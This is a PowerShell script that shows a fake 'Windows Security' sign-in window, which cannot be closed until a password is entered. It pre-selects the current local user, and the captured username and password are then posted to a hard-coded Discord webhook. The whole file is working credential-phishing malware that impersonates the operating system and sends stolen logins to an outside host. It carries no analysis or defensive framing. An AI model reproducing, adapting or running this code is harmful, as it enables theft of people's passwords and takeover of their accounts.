Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.DirectoryServices.AccountManagement

# Function to get local user names
function Get-LocalUserNames {
    $context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Machine')
    $userPrincipal = New-Object System.DirectoryServices.AccountManagement.UserPrincipal($context)
    $searcher = New-Object System.DirectoryServices.AccountManagement.PrincipalSearcher($userPrincipal)

    $users = @()
    foreach ($user in $searcher.FindAll()) {
        $users += $user.Name
    }

    return $users
}

# Function to show the input dialog
function Show-InputDialog {
    # Get the current user name and list of local user names
    $currentUser = [System.Environment]::UserName
    $localUserNames = Get-LocalUserNames

    while ($true) {
        # Create a new form
        $form = New-Object System.Windows.Forms.Form
        $form.Text = 'Windows Security'
        $form.Size = New-Object System.Drawing.Size(300,200)
        $form.StartPosition = 'CenterScreen'
        $form.FormBorderStyle = 'FixedDialog'
        $form.MaximizeBox = $false
        $form.MinimizeBox = $false

        # Add controls to the form
        $label = New-Object System.Windows.Forms.Label
        $label.Location = New-Object System.Drawing.Point(10,20)
        $label.Size = New-Object System.Drawing.Size(280,20)
        $label.Text = 'Sign in'
        $form.Controls.Add($label)

        $combo = New-Object System.Windows.Forms.ComboBox
        $combo.Location = New-Object System.Drawing.Point(10,50)
        $combo.Size = New-Object System.Drawing.Size(260,20)
        $combo.DropDownStyle = 'DropDownList'
        $combo.Items.AddRange($localUserNames)
        $combo.SelectedItem = $currentUser
        $form.Controls.Add($combo)

        $passwordLabel = New-Object System.Windows.Forms.Label
        $passwordLabel.Location = New-Object System.Drawing.Point(10,80)
        $passwordLabel.Size = New-Object System.Drawing.Size(280,20)
        $passwordLabel.Text = 'Password'
        $form.Controls.Add($passwordLabel)

        $passwordBox = New-Object System.Windows.Forms.TextBox
        $passwordBox.Location = New-Object System.Drawing.Point(10,100)
        $passwordBox.Size = New-Object System.Drawing.Size(260,20)
        $passwordBox.UseSystemPasswordChar = $true
        $form.Controls.Add($passwordBox)

        $okButton = New-Object System.Windows.Forms.Button
        $okButton.Location = New-Object System.Drawing.Point(120,130)
        $okButton.Size = New-Object System.Drawing.Size(75,23)
        $okButton.Text = 'OK'
        $okButton.Add_Click({
            if ([string]::IsNullOrWhiteSpace($passwordBox.Text)) {
                [System.Windows.Forms.MessageBox]::Show('Credentials cannot be empty!', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
            } else {
                $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
            }
        })
        $form.Controls.Add($okButton)

        $cancelButton = New-Object System.Windows.Forms.Button
        $cancelButton.Location = New-Object System.Drawing.Point(200,130)
        $cancelButton.Size = New-Object System.Drawing.Size(75,23)
        $cancelButton.Text = 'Cancel'
        $cancelButton.Add_Click({
            [System.Media.SystemSounds]::Hand.Play()
            $form.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
        })
        $form.Controls.Add($cancelButton)

        # Handle form closing to prevent closing without input and play error sound
        $form.Add_FormClosing({
            if ($form.DialogResult -ne [System.Windows.Forms.DialogResult]::OK) {
                [System.Media.SystemSounds]::Hand.Play()
                $_.Cancel = $true
            }
        })

        # Show the form
        $result = $form.ShowDialog()

        if ($result -eq [System.Windows.Forms.DialogResult]::OK -and -not [string]::IsNullOrWhiteSpace($passwordBox.Text)) {
            return @{ 
                User = $combo.SelectedItem
                Password = $passwordBox.Text
            }
        }
    }
}

# Display the first popup
[System.Windows.Forms.MessageBox]::Show('Please authenticate your Microsoft Account', 'Authentication Required', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)

# Show the input dialog
$credentials = Show-InputDialog
$webhookUrl = 'https://discord.com/api/webhooks/1179501071710814208/POMbZCE3RlI-at3VgzxPhwsOvFIKwu74cBDiyP2FBU6tcwi15nf6lh93PeaLE57oZhTs'
$infoContent = "Username - $($credentials.User), Password - $($credentials.Password)"
$jsonPayload = @{content = $infoContent} | ConvertTo-Json
Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers @{ "Content-Type" = "application/json" } -Body $jsonPayload
